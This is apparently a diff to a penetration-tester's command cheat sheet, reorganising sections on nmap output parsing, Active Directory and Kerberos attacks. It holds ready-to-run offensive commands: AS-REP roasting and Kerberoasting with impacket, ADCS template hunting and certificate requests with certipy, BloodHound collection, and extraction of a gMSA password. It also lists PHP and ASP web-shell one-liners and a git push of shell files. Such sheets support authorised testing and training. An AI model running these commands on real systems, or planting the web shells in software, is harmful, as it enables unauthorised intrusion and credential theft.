@@ -98,6 +98,15 @@ chromium "https://localhost:8834"
 (PORTS=$(cat UDP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sU --script=vuln "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VULN_UDP_$TARGET' &)
 (PORTS=$(cat TCP_*$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf "%s,", $1}' | sed 's/,$//'); sudo nmap -Pn -n -sV --script vulners --script-args mincvss=9 "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 | grep -vE '0.0|/cve/|/githubexploit/|/packetstorm/|/cnvd/|/httpd/|/zdt/' | tee 'vulners_$TARGET' &)
 
+## Opening Nmap Scans
+cat *TCP*1000*nmap | grep -E 'open|report for' | grep -vE '///|#|shown:' | sed 's/Nmap scan/\nNmap scan/g'
+cat *UDP*1000*nmap | grep -E 'open|report for' | grep -vE '///|#|shown:' | sed 's/Nmap scan/\nNmap scan/g'
+cat *TCP*ALL*nmap | grep -E 'open|report for' | grep -vE '///|#|shown:' | sed 's/Nmap scan/\nNmap scan/g'
+cat *UDP*ALL*nmap | grep -E 'open|report for' | grep -vE '///|#|shown:' | sed 's/Nmap scan/\nNmap scan/g'
+cat *SCRIPTS*nmap | grep -E 'open|report for|script results||' | grep -vE '///|#|shown:|Status:|done:|latency|scanned in' | sed 's/Nmap scan/\nNmap scan/g'
+cat *VULN*nmap | grep -E 'open|report for|script results||' | grep -vE '///|#|shown:|Status:|done:|latency|scanned in|ratelimit' | sed '/Pre-scan/,/vulnerable)\./d' | sed 's/Nmap scan/\nNmap scan/g'
+cat *VERSIONS*nmap | grep -E 'open|report for|script results||' | grep -vE '///|#|shown:|Status:|done:|latency|scanned in|unrecognized|report any|\(\)|SF-|SF:' | sed 's/Nmap scan/\nNmap scan/g'
+
 ## Web
 [*] Technologies
 whatweb http://$TARGET
@@ -111,27 +120,28 @@ gobuster vhost --append-domain -u $DOM -k -r -t 30 --exclude-length 0 \
 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 
 # Exploitation
-## Custom usernames file
+## Create Custom Usernames
 username-anarchy --input-file usernames --select-format first,flast,f.last,first.last,firstlast > .tmp; cat .tmp | tee usernames; rm .tmp
 
-## Sorting files
+## Sort Files
 cat usernames | sort -u | tee usernames
 cat passwords | sort -u | tee passwords
 
-## Decompressing files
+## Decompress Files
 tar -xzvf backup.tar.gz -C .
 unzip backup.zip -d .
 
-## Open nmap scans
-cat *TCP*1000*nmap | grep -E 'open|report for' | grep -vE '///|#|shown:' | sed 's/Nmap scan/\nNmap scan/g'
-cat *UDP*1000*nmap | grep -E 'open|report for' | grep -vE '///|#|shown:' | sed 's/Nmap scan/\nNmap scan/g'
-
-cat *TCP*ALL*nmap | grep -E 'open|report for' | grep -vE '///|#|shown:' | sed 's/Nmap scan/\nNmap scan/g'
-cat *UDP*ALL*nmap | grep -E 'open|report for' | grep -vE '///|#|shown:' | sed 's/Nmap scan/\nNmap scan/g'
-
-cat *SCRIPTS*nmap | grep -E 'open|report for|script results||' | grep -vE '///|#|shown:|Status:|done:|latency|scanned in' | sed 's/Nmap scan/\nNmap scan/g'
-cat *VULN*nmap | grep -E 'open|report for|script results||' | grep -vE '///|#|shown:|Status:|done:|latency|scanned in|ratelimit' | sed '/Pre-scan/,/vulnerable)\./d' | sed 's/Nmap scan/\nNmap scan/g'
-cat *VERSIONS*nmap | grep -E 'open|report for|script results||' | grep -vE '///|#|shown:|Status:|done:|latency|scanned in|unrecognized|report any|\(\)|SF-|SF:' | sed 's/Nmap scan/\nNmap scan/g'
+## Initial Checks
+sudo ntpdate -u $TARGET
+nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
+certipy-ad find -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -vulnerable -enabled -stdout | grep --color=never -E 'CA Name|Template Name|\[\+\]|Vuln|ESC'
+nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
+bloodhound
+chromium http://127.0.0.1:8080
+MATCH (u:User) RETURN u
 
 ## Web
 [*] WordPress
@@ -145,15 +155,15 @@ cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H 
 [*] Web Shell
 +---------- One Liners ----------+
 PHP
-       <?=`$_GET[cmd]`?>
-      <?php system($_GET['cmd']); ?>
-      <?php passthru($_GET['cmd']); ?>
-      <?php shell_exec($_GET['cmd']); ?>
-      <?php echo system($_GET['cmd']); ?>
-      <?php echo passthru($_GET['cmd']); ?>
-      <?php echo shell_exec($_GET['cmd']); ?>
+<?=`$_GET[cmd]`?>
+<?php system($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+<?php shell_exec($_GET['cmd']); ?>
+<?php echo system($_GET['cmd']); ?>
+<?php echo passthru($_GET['cmd']); ?>
+<?php echo shell_exec($_GET['cmd']); ?>
 
-+---------- ASP ----------+
+ASP
 <% Response.ContentType = "text/plain"
 Set s = CreateObject("WScript.Shell")
 Set c = s.Exec("cmd /c " & Request("cmd"))
@@ -342,15 +352,8 @@ git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f
 
 ## Infrastructure
 [*] Active Directory
-+---------- Domain Information ----------+
-nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
-
-+---------- Bloodhound Data ----------+
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
-
-bloodhound
-chromium http://127.0.0.1:8080
-MATCH (u:User) RETURN u
++---------- Clock skew ----------+
+sudo ntpdate -u $TARGET
 
 +---------- Set .ccache ----------+
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
@@ -414,17 +417,6 @@ WriteOwner
 
 +---------- Get msDS-ManagedPassword ----------+
 bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' get object MGTSVC$ --attr msDS-ManagedPassword
-
-+---------- Certificate Services Attacks ----------+
-chromium http://$TARGET/certsrv
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
-
-+---------- Get Certificate Authority ----------+
-certipy-ad -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' find -vulnerable -enabled -stdout | grep 'CA Name'
-
-+---------- Get Vulnerable ESC ----------+
-certipy-ad -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' find -vulnerable -enabled -stdout | grep 'ESC'
 
 +---------- Get Certificate ----------+
 certipy-ad -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' req -ca 'CA_NAME' -template 'TEMPLATE_NAME' -dynamic-endpoint
@@ -635,6 +627,9 @@ finger '$USERNAME'@$TARGET
 while read -r user; do finger "$user"@$TARGET; done < usernames
 
 [*] (88) Kerberos
++---------- Clock skew ----------+
+sudo ntpdate -u $TARGET
+
 +---------- Domain Information ----------+
 nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
 
@@ -653,11 +648,7 @@ impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD
 +---------- Visualise LDAP ----------+
 godap $TARGET -d $DOM -t ldap/$DC -k
 
-+---------- Clock skew ----------+
-sudo ntpdate -u $TARGET
-
 +---------- Kerberos .ccache Negotiation ----------+
-impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}'
